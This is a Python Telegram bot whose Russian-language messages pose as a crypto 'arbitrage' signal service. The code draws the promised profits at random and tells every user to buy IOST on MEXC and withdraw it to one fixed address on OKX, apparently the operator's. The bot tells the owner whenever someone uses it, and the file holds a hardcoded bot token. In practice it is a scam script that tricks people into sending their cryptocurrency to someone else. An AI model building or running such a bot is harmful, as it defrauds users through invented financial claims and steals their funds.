# INFO | INFO | INFO
TOKEN = '7204909915:AAGhVDCUz9IVvMIKXheTeMNOGhrbE5SOR8Q'
my_id = "6484525704"
option1_selected = False
# INFO | INFO | INFO

import telebot
from telebot import types
import random

bot = telebot.TeleBot(TOKEN)




@bot.message_handler(commands=['start'])
def start_message(message):
    bot.send_message(my_id, "Кто то стартанул)")
    bot.send_message(message.chat.id, """Добро пожаловать в Arbitration bot.🤖 
Давай сперва объясню суть, как со мной работать и получать прибыль с сделок
                     
\nПо команде - /trade ты будешь получать текст
следующего содержания:""")
    bot.send_message(message.chat.id, """
VALUE : IOST 💶
BUY - MEXC 💹
SELL - OKX 🉐
ADRES: iost_not 📂
PROFIT 2.4%-3.5% 💲
TIME - 40min 🕐""")
    bot.send_message(message.chat.id, """
Теперь раскладываем все по полочкам!

Качаем 3 основные биржи - OKX, MEXC, HTX. 
С ними мы будем чаше всего работать. Так же, проходим в них верификацию.

Заходим на биржу в строчке 'BUY', и покупаем валюту со строчки 'VALUE'.
Далее переходим на биржу со строчки 'SELL' нажимаем:
Мой кошелек -> Депозит -> в поиске валюту с 'VALUE'.
Копируем memo с вашего аккаунта. 

Делаем вывод вывод с биржи 'BUY' на биржу 'SELL', и указываем адрес с 'ADRES'.""")
    bot.send_message(message.chat.id, """
Все! Далее ожидаем прибыль на аккаунте 'SELL'. Это может занять от 5 до 120 минут, в зависимости нагрузки болкчейна. Главное успеть это сделать в период 'TIME'. Тогда вы получите обещанный профит в размере 'PROFIT'.
""")
    bot.send_message(message.chat.id, """
Наша выгода на основе реферальной системе. Мы получаем % с ваших кругов. 
Лично наши рекомендации:
Начни с более маленькой суммой. 5$!
""")
    bot.send_message(message.chat.id, """
Желаем удачи в совершении кругов!
Для повторного вызова данного окна - /start
Для согласия на получения связки - /trade
""")
import random
import time

# Словарь для хранения информации о времени, когда пользователь активировал команду trade
trade_users = {}

# Функция для отправки сообщения
def send_trade_message(chat_id, prof1, prof2, time):
    bot.send_message(chat_id, f"""
    VALUE : IOST 💶
    BUY - MEXC 💹
    SELL - OKX 🉐
    ADRES: iost_not 📂
    PROFIT {prof1}% - {prof2}% 💲
    TIME - {time} 🕐
    """)

# Обработчик команды trade
@bot.message_handler(commands=['trade'])
def start_trade_message(message):
    chat_id = message.chat.id
    if chat_id not in trade_users:
        trade_users[chat_id] = time.time()
        bot.send_message(my_id, "Кто то трейданул)")
        bot.send_message(chat_id, "Ожидайте связку. Как будет открыто окно, мы будем вас оповещать.")

# Функция для отправки уведомлений всем пользователям, активировавшим команду trade
def send_trade_notifications():
    prof1 = random.choice(['1.9', '2.0', '2.1', '2.2', '2.3', '2.4', '2.5']) 
    prof2 = random.choice(['3.2', '3.3', '3.4', '3.5', '3.6', '3.7', '3.9'])
    global time_to_wait
    time_to_wait = random.randint(1200, 3000)
    
    current_time = time.time()
    
    for user_id, activation_time in trade_users.items():
        if current_time - activation_time >= time_to_wait:
            send_trade_message(user_id, prof1, prof2, time_to_wait)

# Функция для обновления значений и отправки уведомлений
def update_trade_values():
    while True:
        send_trade_notifications()
        time.sleep(time_to_wait + time_to_wait/100*10) 

# Запуск функции обновления значений и отправки уведомлений в отдельном потоке
import threading
update_thread = threading.Thread(target=update_trade_values)
update_thread.start()


# Запуск бота
bot.polling()
